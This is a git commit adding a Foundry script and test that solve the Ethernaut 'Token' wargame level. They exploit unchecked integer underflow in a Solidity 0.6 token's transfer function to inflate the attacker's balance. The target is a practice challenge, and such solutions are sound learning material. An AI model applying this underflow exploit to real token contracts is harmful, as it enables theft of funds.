141765f1b9b0898de5c9d0e48af1cfe6ed8c271e
Jaqensv <matthieu.dl@hotmail.fr>
2025-04-26 14:16:16 +0200

    ethernaut-token

---
+++ script/Token.sol
@@ -0,0 +1,19 @@
+// SPDX-Licence-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "instances/IToken.sol";
+import "forge-std/Script.sol";
+
+contract Attacker is Script {
+    Token instance = Token(payable(0xa4516EF85aA1c5D81988c82ccDE5192f0c4EaD25));
+    function run() external {
+        vm.startBroadcast(uint256(vm.envBytes32("PRIVATE_KEY")));
+        instance.transfer(address(this), 20);
+        withdraw();
+        vm.stopBroadcast();
+    }
+
+    function withdraw() public payable {
+        instance.transfer(msg.sender, 50);
+    }
+}
--- test/TokenTest.sol
+++ test/TokenTest.sol
@@ -1,12 +1,23 @@
 // SPDX-Licence-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "forge-std/Test.sol";
 import "instances/IToken.sol";
+import "custom_lib/Console.sol";
+import "custom_lib/Test.sol";
 
-contract Attacker is Test {
+contract Attacker is Test, Console {
     Token instance = Token(payable(0xa4516EF85aA1c5D81988c82ccDE5192f0c4EaD25));
     function test() external {
-        console.log(instance.balanceOf(msg.sender));
+        log("msg sender", msg.sender);
+        log("Initial balance", instance.balanceOf(msg.sender));
+        instance.transfer(address(this), 20);
+        log("Current balance", instance.balanceOf(msg.sender));
+        withdraw();
+        log("Final balance", instance.balanceOf(msg.sender));
+    }
+
+    function withdraw() public payable {
+        log("Withdraw");
+        instance.transfer(msg.sender, 1000);
     }
 }
